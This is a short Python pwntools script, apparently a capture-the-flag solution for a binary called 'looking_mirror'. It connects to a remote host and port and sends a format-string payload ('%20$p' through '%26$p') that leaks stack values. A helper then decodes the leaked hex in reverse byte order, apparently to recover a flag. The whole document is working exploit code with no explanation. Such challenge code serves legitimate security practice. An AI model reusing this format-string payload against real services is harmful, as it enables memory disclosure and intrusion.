from pwn import *
def hex_to_ascii(hex_str):
    if len(hex_str) % 2 != 0:
        # Ensure the hex string length is even
        hex_str = "0" + hex_str
    return ''.join(chr(int(hex_str[i:i+2], 16)) for i in range(0, len(hex_str), 2))[::-1]

exe = context.binary = ELF('looking_mirror')
io = remote('65.0.128.220', 31895) 
io.recvuntil(b'> ')
payload = b'%20$p.%21$p.%22$p.%23$p.%24$p.%25$p.%26$p'
io.sendline(payload)
var = io.recvline()
print(var)